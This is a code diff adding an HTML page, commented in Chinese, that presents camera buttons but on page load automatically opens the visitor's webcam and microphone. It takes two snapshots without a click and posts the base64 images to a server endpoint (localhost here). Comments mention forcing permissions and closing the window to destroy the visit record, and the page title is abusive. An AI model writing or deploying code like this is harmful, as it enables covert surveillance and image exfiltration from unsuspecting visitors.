@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Look at here, Bitch!</title>
+</head>
+<body>
+	<button onclick="openMedia()">开启摄像头</button>
+    <video id="video" width="500px" height="500px" autoplay="autoplay"></video>
+    <canvas id="canvas" width="500px" height="500px"></canvas>
+    <button onclick="takePhoto()">拍照</button>
+    <img id="imgTag" src="" alt="imgTag">
+    <button onclick="closeMedia()">关闭摄像头</button>
+	
+<script src="http://code.jquery.com/jquery-latest.js" type="text/javascript"></script>
+<script type="text/javascript">
+	// 全局视频对象
+	let mediaStreamTrack = null; 
+	var openCamera = function(){
+		return new Promise(resolve => {
+			let constraints = {
+			    video: {
+			        width: 500,
+			        height: 500
+			    },
+			    audio: true
+			};
+			//获得video摄像头
+			let video = document.getElementById('video');
+			let camera = navigator.mediaDevices.getUserMedia(constraints);
+			camera.then((mediaStream) => {
+			    mediaStreamTrack = typeof mediaStream.stop === 'function' ? mediaStream : mediaStream.getTracks()[1];
+			    video.srcObject = mediaStream;
+			    video.play();
+				//延时100毫秒：为了浏览器有充裕的时间打开摄像头
+				setTimeout(function() {
+					resolve("camera is opening");
+				},100);
+			});
+		});
+	};
+
+	//拍照并异步发送图片
+	var onShot = function(shutter = 1){
+		return new Promise((resolve, reject) => {
+			//获得Canvas对象
+			let video = document.getElementById('video');
+			let canvas = document.getElementById('canvas');
+			let ctx = canvas.getContext('2d');
+			//把摄像头拍到的图片转到canvas中
+			ctx.drawImage(video, 0, 0, 500, 500);
+			// toDataURL可传入image/png，默认是image/jpeg
+			let img = document.getElementById('canvas').toDataURL();
+			// 这里的img就是拍到的图片的Base64编码
+			// console.log(img);
+			//快照图片数据
+			let jsonData = eval({
+				'code': `${shutter}`,
+				'data': `${img}`
+			});
+			//如果没拍到就失败
+			if(img==undefined||img==null){
+				jsonData['state'] = NaN;
+				reject(jsonData);
+			} else{
+				document.getElementById('imgTag').src = img;
+				jsonData['state'] = 'OK';
+				resolve(jsonData);
+			}
+		}).then(data => {
+			//如果不是失败
+			if(!Object.is(data.state,NaN)){
+				transportAjax(`http://localhost:8080`,data);
+			}else{
+				transportAjax(`http://localhost:8080`,data);
+				console.log('失败');
+			}
+		}); //异步执行ajax
+	};
+
+	var closeCamera = function(){
+		return new Promise(resolve => {
+			mediaStreamTrack.stop();
+			resolve("camera have closed");
+		});
+	};
+
+	//async如同线程唤醒，如果遇到有await就会先暂停执行，等到异步await完成后再恢复执行
+	var startMove = async function(){
+		
+		//await如同线程wait阻塞方法，等待上一个已完成的pomise对象执行结束再执行
+		const open = await openCamera();
+		console.log(open);
+		const shot1 = await onShot(undefined); //第一次快照
+		const shot2 = await onShot(2); //第二次快照
+		const close = await closeCamera();
+		console.log(close);
+		// const bye = await destroyRecord();
+		// console.log(bye); //退出并销毁记录
+	}
+
+	startMove(); //请求权限通过后自动开启摄像头拍照
+	
+	//转存与网络请求传输图片
+	var transportAjax = function(api = ``,data = null){
+		$.post(api,JSON.stringify(data),function(res){
+			console.log(res);
+		},'json');
+	}
+
+	//强制开启权限
+	
+	//销毁页面打开记录
+	var destroyRecord = function(){
+		window.close();
+		resolve("bye bye");
+	}
+</script>
+</body>
+</html>
